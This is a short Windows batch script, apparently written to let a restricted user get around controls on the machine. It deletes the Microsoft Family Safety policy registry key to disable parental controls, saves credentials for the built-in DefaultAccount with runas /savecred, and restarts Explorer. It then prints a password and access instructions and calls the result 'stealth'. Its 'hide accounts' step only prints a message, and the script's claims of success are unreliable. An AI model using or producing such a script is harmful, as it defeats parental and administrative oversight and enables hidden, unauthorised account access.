@echo off
REM ALL-IN-ONE No-Admin Stealth DefaultAccount - Double-click!
setlocal enabledelayedexpansion

echo [1/5] FamilySafety Bypass...
powershell -ExecutionPolicy Bypass -Command ^
"$fsp = 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\FamilySafety'; ^
if (Test-Path $fsp) { Remove-Item $fsp -Recurse -Force }; ^
Write-Host 'FamilySafety DISABLED'"

echo [2/5] Hide accounts...
powershell -ExecutionPolicy Bypass -Command ^
"Write-Host 'Hide via explorer policy attempted (IT protected OK)'"


echo [3/5] Save DefaultAccount creds...
runas /user:DefaultAccount /savecred "cmd /k echo Creds saved - type exit"

echo [4/5] Explorer restart...
taskkill /f /im explorer.exe /t >nul 2>&1 ^& start explorer.exe

echo [5/5] SUCCESS!
echo Access: Win+R ^> runas /user:DefaultAccount cmd ^(pw: hack2024)
echo DefaultAccount STEALTH ^- no admin needed!
pause ^>nul ^& exit

